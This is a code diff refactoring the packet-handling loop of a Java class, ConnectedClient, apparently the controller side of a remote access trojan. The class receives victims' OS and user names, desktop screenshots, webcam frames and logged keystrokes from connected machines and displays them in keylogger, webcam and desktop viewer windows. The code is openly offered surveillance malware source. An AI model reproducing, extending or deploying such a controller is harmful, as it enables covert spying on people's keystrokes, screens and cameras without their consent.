@@ -17,9 +17,10 @@ import me.sebsb.gui.GuiDesktop;
 import me.sebsb.gui.GuiKeyLogger;
 import me.sebsb.gui.GuiText;
 import me.sebsb.gui.GuiWebcam;
-import me.sebsb.utils.Message;
 import me.sebsb.utils.MessageType;
 import me.sebsb.utils.NetUtils;
+import me.sebsb.utils.Packet;
+
 public class ConnectedClient{
 
 	private PrintWriter pw;
@@ -32,7 +33,6 @@ public class ConnectedClient{
 	private GuiDesktop desktop;
 	private GuiWebcam webcam;
 	private GuiKeyLogger keylog;
-	
 	
 	public ConnectedClient(Socket socket) throws IOException {
 		this.lastIP = socket.getInetAddress().getHostAddress();
@@ -57,51 +57,28 @@ public class ConnectedClient{
 		boolean disconnected = false;
 		while (!disconnected) {
 			try {
-				Message message = NetUtils.readLine(this.br);
-				if (message.getType() == MessageType.GUI_TEXT) {
-					new GuiText(message.getText());
-				} else if (message.getType() == MessageType.INFO) {
-					for (String str : message.getText()) {
-						if (str.startsWith("OS:")) {
-							this.os = str.split(":")[1];
-						} else if (str.startsWith("USER:")) {
-							this.userName = str.split(":")[1];
-						}
-					}
+				String line = br.readLine();
+				if (line == null) {
+					throw new ClientDisconnectedException();
+				}
+				
+				Packet packet = NetUtils.readPacket(line);
+				if (packet.action == MessageType.GUI_TEXT.getID()) {
+					new GuiText(packet.data);
+				} else if (packet.action == MessageType.INFO.getID()) {
+					this.os = packet.data.get(0);
+					this.userName = packet.data.get(1);
 					Server.getInstance().getGUI().updateInfo();
-				} else if (message.getType() == MessageType.DESKTOP) {
-					if (desktop == null) {
-						desktop = new GuiDesktop(this);
-					}
-					if (this.desktop.isActive()) {
-						StringBuilder sb = new StringBuilder();
-						for (String str : message.getText()) {
-							sb.append(str);
-						}
-						if (sb.toString().length() >= 2) {
-							byte[] decodedBytes = Base64.getDecoder().decode(sb.toString());
-						    ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
-						    BufferedImage i = ImageIO.read(bais);
-							if (i != null) {
-						        this.desktop.setImage(i);
-							}
-						}
-					}
-				} else if (message.getType() == MessageType.WEBCAM) {
+				} else if (packet.action == MessageType.WEBCAM.getID()) {
 					if (webcam == null) {
 						webcam = new GuiWebcam(this);
 					}
 					if (this.webcam.isActive()) {
-						StringBuilder sb = new StringBuilder();
-						for (String str : message.getText()) {
-							sb.append(str);
-						}
-						if (message.getText().get(0).equals("error")) {
+						if (packet.data.get(0).equals("error")) {
 							this.webcam.setNoWebcam();
 							return;
-						}
-						if (sb.toString().length() >= 2) {
-							byte[] decodedBytes = Base64.getDecoder().decode(sb.toString());
+						} else {
+							byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0).toString());
 						    ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
 						    BufferedImage i = ImageIO.read(bais);
 							if (i != null) {
@@ -109,22 +86,29 @@ public class ConnectedClient{
 							}
 						}
 					}
-				} else if (message.getType() == MessageType.KEYLOG) {
-					if (keylog == null) {
-						keylog = new GuiKeyLogger(this);
+				} else if (packet.action == MessageType.DESKTOP.getID()) {
+					if (desktop == null) {
+						desktop = new GuiDesktop(this);
 					}
-					keylog.addKey(message.getText().get(0));
+					if (this.desktop.isActive()) {
+						byte[] decodedBytes = Base64.getDecoder().decode(packet.data.get(0).toString());
+					    ByteArrayInputStream bais = new ByteArrayInputStream(decodedBytes);
+					    BufferedImage i = ImageIO.read(bais);
+						if (i != null) {
+					        this.desktop.setImage(i);
+						}
+					}
+				} else if (packet.action == MessageType.KEYLOGGER.getID()) {
+					if (keylog != null) {
+						keylog.addKey(packet.data.get(0));
+					}
 				}
 			} catch (ClientDisconnectedException e) {
 				e.printStackTrace();
 				Server.getInstance().removeClient(this);
 				disconnected = true;
-			} catch (SocketException eee) {
-				eee.printStackTrace();
-			}catch (IOException e) {
-				e.printStackTrace();
-			} catch (NumberFormatException ee) {
-				ee.printStackTrace();
+			} catch (SocketException e1 ) {
+				disconnected = true;
 			} catch (Exception e) {
 				e.printStackTrace();
 			}
